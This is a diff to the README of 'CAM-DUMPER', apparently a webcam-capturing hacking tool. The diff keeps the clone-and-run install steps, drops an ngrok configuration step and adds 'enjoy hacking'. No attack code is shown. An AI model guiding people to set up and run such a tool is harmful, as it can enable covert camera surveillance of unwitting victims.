@@ -18,11 +18,7 @@ $ apt install git php wget curl jq
 $ git clone https://github.com/LiNuX-Mallu/CAM-DUMPER.git
 $ cd CAM-DUMPER
 $ chmod +x camdumper.sh
-$ echo "web_addr: 4045" >> $HOME/.ngrok2/ngrok.yml
 $ ./camdumper.sh
 ```
- •if $HOME/.ngrok2/ngrok.yml doesnt exist then
-you must create it by running-
-```
-$ mkdir $HOME/.ngrok2 && touch $HOME/.ngrok2/ngrok.yml
-```
+
+#### enjoy hacking
